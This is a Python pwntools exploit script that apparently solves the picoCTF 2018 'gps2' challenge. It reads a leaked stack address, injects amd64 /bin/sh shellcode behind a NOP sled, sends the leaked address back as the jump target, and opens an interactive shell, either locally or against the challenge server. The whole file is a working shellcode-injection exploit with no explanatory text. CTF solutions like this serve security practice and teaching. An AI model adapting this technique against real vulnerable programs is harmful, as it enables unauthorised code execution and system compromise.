#!/usr/bin/env python

from pwn import *
import sys
argc = len(sys.argv)

LOCAL = True

def exploit(p):
	p.recvuntil("Current position: ")

	STACK = int(p.recvline()[:-1], 16) #Gather the stack address leak
	p.recvuntil("> ")

	log.info('Stack       : %s' % hex(STACK))
	#TARGET = STACK+0x220

	context.arch = "amd64"
	shellcode = asm(shellcraft.amd64.sh())	#Build the shellcode

	payload = "\x90"*(900-len(shellcode)) #Fill the extra buffer with NOPs
	payload+= shellcode

	p.sendline(payload)

	p.recvuntil("> ")

	#log.info("Target       : %s" % hex(TARGET))
	p.sendline(hex(STACK))		#Send back the stack leak and hope our sled is there

	p.interactive()

	return






if __name__ == '__main__':
	if argc > 1:
		LOCAL = False
		p = remote('2018shell.picoctf.com', 29035)
		exploit(p)
	else:
		p = process('./gps2')
		# print util.proc.pidof(p)
		# pause()
		exploit(p)
